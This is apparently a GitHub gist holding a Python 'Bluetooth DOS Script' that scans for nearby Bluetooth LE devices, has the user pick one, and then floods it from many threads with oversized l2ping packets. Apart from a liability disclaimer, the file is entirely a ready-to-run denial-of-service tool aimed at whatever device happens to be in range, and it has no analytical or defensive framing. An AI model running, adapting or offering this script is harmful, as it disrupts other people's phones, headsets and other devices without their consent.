#date: 2023-12-20T17:02:36Z
#url: https://api.github.com/gists/011cbd92df6ee234992cfca14f13ea63
#owner: https://api.github.com/users/PaulGG-Code

import os
import threading
import time
import subprocess

def DOS(target_addr, packages_size):
    os.system('l2ping -i hci0 -s ' + str(packages_size) + ' -f ' + target_addr)

def printLogo():
    print('\x1b[37;36m')
    print('                            Bluetooth DOS Script                            ')
    
def main():
    printLogo()
    time.sleep(0.1)
    print('')
    print('\x1b[31mTHIS SOFTWARE IS PROVIDED "AS IS" WITHOUT WARRANTY OF ANY KIND. YOU MAY USE THIS SOFTWARE AT YOUR OWN RISK. THE USE IS COMPLETE RESPONSIBILITY OF THE END-USER. THE DEVELOPERS ASSUME NO LIABILITY AND ARE NOT RESPONSIBLE FOR ANY MISUSE OR DAMAGE CAUSED BY THIS PROGRAM.')
    if input("Do you agree? (y/n) > ") in ['y', 'Y']:
        time.sleep(0.1)
        os.system('clear')
        printLogo()
        print('')
        print("Scanning ...")

        # Start the scan in a separate process
        scan_process = subprocess.Popen(["sudo", "hcitool", "lescan"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        
        # Wait for 10 seconds then terminate the scan
        time.sleep(10)
        scan_process.terminate()

        # Read the output of the scan
        output = scan_process.stdout.read().decode('utf-8')
        lines = output.splitlines()
        devices = {}
        for line in lines:
            parts = line.split(' ')
            if len(parts) >= 2:
                addr = parts[0]
                name = ' '.join(parts[1:])
                devices[addr] = name

        print("|id   |   mac_address  |   device_name|")
        for idx, (addr, name) in enumerate(devices.items()):
            print(f"|{idx}   |   {addr}  |   {name} |")
        
        target_id = int(input('Target id > '))
        target_addr = list(devices.keys())[target_id]

        if len(target_addr) < 1:
            print('[!] ERROR: Target addr is missing')
            exit(0)

        try:
            packages_size = int(input('Packages size > '))
        except:
            print('[!] ERROR: Packages size must be an integer')
            exit(0)
        try:
            threads_count = int(input('Threads count > '))
        except:
            print('[!] ERROR: Threads count must be an integer')
            exit(0)
        print('')
        os.system('clear')

        print("\x1b[31m[*] Starting DOS attack in 3 seconds...")

        for i in range(3):
            print('[*] ' + str(3 - i))
            time.sleep(1)
        os.system('clear')
        print('[*] Building threads...\n')

        for i in range(threads_count):
            print('[*] Built thread №' + str(i + 1))
            threading.Thread(target=DOS, args=[str(target_addr), str(packages_size)]).start()

        print('[*] Built all threads...')
        print('[*] Starting...')
    else:
        print('Bip bip')
        exit(0)

if __name__ == '__main__':
    try:
        os.system('clear')
        main()
    except KeyboardInterrupt:
        time.sleep(0.1)
        print('\n[*] Aborted')
        exit(0)
    except Exception as e:
        time.sleep(0.1)
        print('[!] ERROR: ' + str(e))
